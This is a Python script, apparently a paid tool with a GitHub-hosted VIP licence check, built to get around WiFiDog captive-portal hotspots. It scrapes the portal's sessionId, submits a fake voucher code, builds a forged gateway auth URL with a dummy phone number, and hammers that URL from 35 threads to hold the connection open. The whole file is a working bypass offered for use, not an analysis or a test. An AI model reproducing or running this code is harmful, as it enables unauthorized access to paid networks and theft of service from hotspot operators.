import requests, re, urllib3, time, threading, os, random, subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- MASTER CONFIG ---
VIP_URL = "https://raw.githubusercontent.com/painglintun895-rgb/my-keys/refs/heads/main/vips.txt"
GAME_THREADS = 35 # လိုင်းမရပ်သွားဖို့ ဒီပမာဏက အငြိမ်ဆုံးပါ
USER_NAME, EXP_DATE, DAYS_LEFT = "MASTER-USER", "--", "?"

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a232"

def update_status():
    global USER_NAME, EXP_DATE, DAYS_LEFT
    uid = get_uid()
    try:
        res = requests.get(f"{VIP_URL}?cb={random.random()}", timeout=10)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if uid in line:
                    parts = line.split('|')
                    USER_NAME, EXP_DATE = parts[1].strip(), parts[2].strip()
                    try:
                        t_res = requests.get("http://worldtimeapi.org/api/timezone/Asia/Yangon", timeout=5)
                        now = datetime.strptime(t_res.json()['datetime'][:10], '%Y-%m-%d')
                    except: now = datetime.now()
                    DAYS_LEFT = (datetime.strptime(EXP_DATE, '%Y-%m-%d') - now).days
                    if DAYS_LEFT < 0: os._exit(0)
    except: pass

def banner():
    os.system('clear')
    uid = get_uid()
    print("\033[93m" + " ="*38)
    print("\033[96m" + """
     ██╗  ██╗ ██████╗  ██████╗██╗      █████╗ ██╗   ██╗
     ██║ ██╔╝██╔═══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝
     █████╔╝ ██║   ██║██║     ██║     ███████║ ╚████╔╝ 
     ██╔═██╗ ██║   ██║██║     ██║     ██╔══██║  ╚██╔╝  
     ██║  ██╗╚██████╔╝╚██████╗███████╗██║  ██║   ██║   
     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   """)
    print(f"\033[95m 👑 USER: {USER_NAME} | \033[92m📅 EXP: {EXP_DATE} ({DAYS_LEFT} Days) | \033[94m🆔: {uid}")
    print("\033[93m ="*38 + "\033[0m")

def turbo_pulse(link):
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    while True:
        try:
            start = time.time()
            # Timeout ကို ၃ စက္ကန့်ပဲ ထားလိုက်လို့ လိုင်းမလေးတော့ပါဘူး
            requests.get(link, timeout=3, verify=False, headers=headers)
            ms = int((time.time() - start) * 1000)
            print(f"\033[92m[✓] 👑 KoＣＬＡＹ 👑 | Turbo >>> [{ms}ms]\033[0m")
            time.sleep(0.08) # လိုင်းမရပ်သွားအောင် Delay ကို နည်းနည်း တိုးထားပါတယ်
        except:
            time.sleep(0.5) # ပြတ်သွားရင် ချက်ချင်းပြန်ကြိုးစားမယ်

def launch():
    banner()
    threading.Thread(target=update_status, daemon=True).start()
    session = requests.Session()
    
    while True:
        try:
            print("\033[94m[*] Bypassing Gateway Path...\033[0m")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            p_url = r.url
            
            r1 = session.get(p_url, verify=False, timeout=5)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            r2 = session.get(n_url, verify=False, timeout=5)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
                
                banner()
                print(f"\033[95m[*] ⚡ MASTER FLOW ACTIVE. STABLE MODE. ⚡\033[0m")
                for _ in range(GAME_THREADS):
                    threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
                
                while True:
                    time.sleep(5)
                    try:
                        # လိုင်းရှိမရှိ အမြဲစစ်နေမယ်
                        if requests.get("http://www.google.com/generate_204", timeout=4).status_code != 204: break
                    except: break
            time.sleep(2)
        except:
            time.sleep(2)

if __name__ == "__main__":
    launch()
